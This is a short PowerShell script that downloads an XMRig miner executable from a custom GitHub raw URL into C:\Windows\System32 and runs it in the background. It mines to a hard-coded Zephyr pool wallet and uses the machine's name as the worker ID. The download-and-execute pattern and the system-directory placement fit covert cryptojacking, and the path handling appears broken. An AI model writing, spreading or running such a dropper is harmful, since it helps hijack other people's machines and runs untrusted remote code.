$filePath = "C:\Windows\System32\xmrig.exe"

function Run-XMRig {
    Set-Location $PSScriptRoot
    
    $donateLevel = 1
    
    $xmrigPath = Join-Path $PSScriptRoot $filePath
    
    $xmrigParams = @{
        'donate-level' = $donateLevel
        'o' = 'sg.zephyr.herominers.com:1123'
        'u' = 'ZEPHs7fstwgccjL2tHvyKKHqhJ42Zw5cY1WzzH4Fk8zs6kaXQ8LCTUeLWNe5iC52YtfPdRoizrs9ccp8Ef3zhQLyXdCvxyox4SJ'
        'p' = $env:COMPUTERNAME
        'a' = 'rx/0'
        'k' = $true
        'B' = $true
    }
    
    $xmrigCommand = "$xmrigPath $($xmrigParams.GetEnumerator() | ForEach-Object { "--$($_.Key) $($_.Value)" })"
    
    Start-Process -FilePath "powershell" -ArgumentList $xmrigCommand -Wait
}

if (-not (Test-Path $filePath)) {
    $url = "https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
    Invoke-WebRequest -Uri $url -OutFile $filePath

    Run-XMRig
} else {
    Run-XMRig
}
